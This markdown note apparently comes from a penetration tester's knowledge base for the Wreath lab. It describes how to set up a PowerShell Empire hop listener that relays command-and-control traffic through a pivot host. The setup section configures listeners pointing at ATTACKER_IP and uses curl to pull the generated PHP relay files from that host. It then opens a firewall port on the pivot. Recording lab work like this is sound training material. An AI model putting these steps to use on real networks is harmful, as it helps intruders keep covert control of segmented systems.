# PowerShell Empire Hop Listener

Used on: **Wreath**

Empire hop listeners proxy agent traffic through an intermediate web server when the final victim cannot reach the main Empire listener directly.

## When to Use

- The target victim cannot reach the main attacker listener due to network segmentation.
- An intermediate pivot host can reach both the attacker and the victim.
- The intermediate pivot host can serve HTTP/PHP traffic.

## Prerequisites

- PowerShell Empire and Starkiller installed.
- A web-capable pivot host that the internal victim can reach.
- Ability to upload the generated hop listener PHP files to the pivot.

## Setup

Start Empire:

<!-- cmd: linux -->
```bash
sudo powershell-empire server
powershell-empire client
```

Create an HTTP listener:

```text
type: http
name: Listener-WEB-200
host: http://ATTACKER_IP
port: 15001
BindIp: 0.0.0.0
```

Create a hop listener:

```text
type: http_hop
name: hop_web
host: http://10.200.180.200
port: 15002
RedirectListener: Listener-WEB-200
```

Transfer generated PHP hop files to the pivot and serve them:

<!-- cmd: linux -->
```bash
sudo python3 -m http.server 80
curl http://ATTACKER_IP/http_hop/admin/get.php -o admin/get.php
curl http://ATTACKER_IP/http_hop/login/process.php -o login/process.php
curl http://ATTACKER_IP/http_hop/news.php -o news.php
php -S 0.0.0.0:15002 &>/dev/null &
firewall-cmd --zone=public --add-port=15002/tcp
```

## Wreath Note

Empire stager generation failed during the room, so Chisel was used for the actual later pivot. The hop-listener pattern is still preserved because it was part of the workflow tested on Wreath.

## Related

- [../tools/powershell-empire.md](../../tools/windows/powershell-empire.md)
- [chisel-pivoting.md](chisel-pivoting.md)


